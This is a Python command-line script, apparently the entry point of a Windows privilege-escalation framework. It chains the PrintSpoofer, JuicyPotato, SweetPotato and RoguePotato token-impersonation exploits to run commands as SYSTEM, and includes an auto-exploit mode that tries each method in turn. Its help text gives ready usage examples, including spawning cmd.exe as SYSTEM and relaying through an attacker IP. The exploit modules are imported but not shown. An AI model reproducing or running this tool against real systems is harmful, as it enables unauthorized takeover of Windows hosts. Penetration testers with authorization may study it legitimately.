import argparse
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent))

from core.privileges import PrivilegeChecker
from core.detector import SystemDetector
from exploits.printspoofer import PrintSpooferExploit
from exploits.roguepotato import RoguePotatoExploit
from exploits.juicypotato import JuicyPotatoExploit
from exploits.sweetpotato import SweetPotatoExploit
from .utils.helpers import print_banner, print_status


def auto_exploit(command: str = "whoami", output_dir: str = "token_impersonation"):
    """
    Automatically try the best Potato method for current system.

    Args:
        command: Command to execute as SYSTEM
        output_dir: Output directory for logs
    """
    print("\n" + "=" * 60)
    print("AUTOMATED TOKEN IMPERSONATION")
    print("=" * 60)

    # Check privileges first
    checker = PrivilegeChecker(output_dir)
    can_impersonate, _ = checker.check_impersonation_privileges()

    if not can_impersonate:
        print("\n[-] Cannot proceed without impersonation privileges")
        return False

    # Detect system and get recommendations
    detector = SystemDetector()
    system_info = detector.detect_system()

    print(f"\n[*] Recommended tools: {' -> '.join(system_info.recommended_tools)}")

    # Try each method
    for method in system_info.recommended_tools:
        print(f"\n[*] Trying: {method}")

        if method == 'printspoofer':
            exploit = PrintSpooferExploit(output_dir)
            success, output = exploit.exploit(command)
            if success:
                return True

        elif method == 'sweetpotato':
            exploit = SweetPotatoExploit(output_dir)
            success, output = exploit.exploit(command)
            if success:
                return True

        elif method == 'juicypotato':
            exploit = JuicyPotatoExploit(output_dir)
            success, output = exploit.exploit(command)
            if success:
                return True

        elif method == 'roguepotato':
            print("[*] RoguePotato requires manual setup (--rhost)")
            continue

    print("\n[-] All methods failed")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="Token Impersonation Framework - Windows Potato Privilege Escalation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Check for impersonation privileges:
    python token_impersonate.py --check

  Detect system and get recommendations:
    python token_impersonate.py --detect

  Auto-exploit with best method:
    python token_impersonate.py --auto --command "whoami"

  Use PrintSpoofer:
    python token_impersonate.py --method printspoofer --command "cmd.exe"

  Use JuicyPotato with specific CLSID:
    python token_impersonate.py --method juicypotato --clsid "{4991d34b-80a1-4291-83b6-3328366b9097}"

  Use RoguePotato:
    python token_impersonate.py --method roguepotato --rhost 192.168.1.100 --rport 9999
        """
    )

    # Assessment options
    assess_group = parser.add_argument_group('Assessment')
    assess_group.add_argument('--check', action='store_true',
                              help='Check for impersonation privileges')
    assess_group.add_argument('--detect', action='store_true',
                              help='Detect system and recommend tools')
    assess_group.add_argument('--auto', action='store_true',
                              help='Auto-exploit with best available method')

    # Exploitation options
    exploit_group = parser.add_argument_group('Exploitation')
    exploit_group.add_argument('--method', '-m', type=str,
                               choices=['printspoofer', 'roguepotato', 'juicypotato', 'sweetpotato'],
                               help='Specific method to use')
    exploit_group.add_argument('--command', '-c', type=str, default='cmd.exe',
                               help='Command to execute as SYSTEM')

    # Method-specific options
    method_group = parser.add_argument_group('Method-Specific Options')
    method_group.add_argument('--rhost', type=str,
                              help='Attacker IP (for RoguePotato)')
    method_group.add_argument('--rport', type=int, default=9999,
                              help='Relay port (for RoguePotato)')
    method_group.add_argument('--clsid', type=str,
                              help='CLSID (for JuicyPotato)')
    method_group.add_argument('--port', '-p', type=int, default=1337,
                              help='Local COM port (for JuicyPotato)')
    method_group.add_argument('--technique', '-t', type=str,
                              choices=['printspoofer', 'efspotato', 'winrm'],
                              help='Technique (for SweetPotato)')

    # Tool paths
    path_group = parser.add_argument_group('Tool Paths')
    path_group.add_argument('--tool-path', type=str,
                            help='Custom path to exploit tool')

    # General options
    general_group = parser.add_argument_group('General')
    general_group.add_argument('--output-dir', type=str, default='token_impersonation',
                               help='Output directory for logs')
    general_group.add_argument('--quiet', '-q', action='store_true',
                               help='Suppress banner output')
    general_group.add_argument('--list-clsids', action='store_true',
                               help='List common CLSIDs for JuicyPotato')

    args = parser.parse_args()

    # Show banner unless quiet
    if not args.quiet:
        print_banner()
        print_status()

    # Handle assessment options
    if args.check:
        checker = PrivilegeChecker(args.output_dir)
        checker.get_current_user_info()
        checker.check_impersonation_privileges()
        checker.check_all_useful_privileges()

    elif args.detect:
        detector = SystemDetector()
        detector.detect_system()
        detector.print_recommendations()

    elif args.auto:
        auto_exploit(args.command, args.output_dir)

    elif args.list_clsids:
        exploit = JuicyPotatoExploit(args.output_dir)
        exploit.list_clsids()

    # Handle specific method
    elif args.method:
        # First check privileges
        checker = PrivilegeChecker(args.output_dir)
        can_impersonate, _ = checker.check_impersonation_privileges()

        if not can_impersonate:
            print("\n[-] No impersonation privileges - exploit will likely fail")
            print("[*] Continuing anyway...")

        if args.method == 'printspoofer':
            exploit = PrintSpooferExploit(args.output_dir)

            if args.tool_path:
                exploit.set_tool_path(args.tool_path)

            success, output = exploit.exploit(command=args.command)
            sys.exit(0 if success else 1)

        elif args.method == 'roguepotato':
            if not args.rhost:
                print("[-] --rhost required for RoguePotato")
                sys.exit(1)

            exploit = RoguePotatoExploit(args.output_dir)

            if args.tool_path:
                exploit.set_tool_path(args.tool_path)

            success, output = exploit.exploit(
                command=args.command,
                rhost=args.rhost,
                rport=args.rport
            )
            sys.exit(0 if success else 1)

        elif args.method == 'juicypotato':
            exploit = JuicyPotatoExploit(args.output_dir)

            if args.tool_path:
                exploit.set_tool_path(args.tool_path)

            success, output = exploit.exploit(
                command=args.command,
                clsid=args.clsid,
                listen_port=args.port
            )
            sys.exit(0 if success else 1)

        elif args.method == 'sweetpotato':
            exploit = SweetPotatoExploit(args.output_dir)

            if args.tool_path:
                exploit.set_tool_path(args.tool_path)

            success, output = exploit.exploit(
                command=args.command,
                technique=args.technique
            )
            sys.exit(0 if success else 1)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()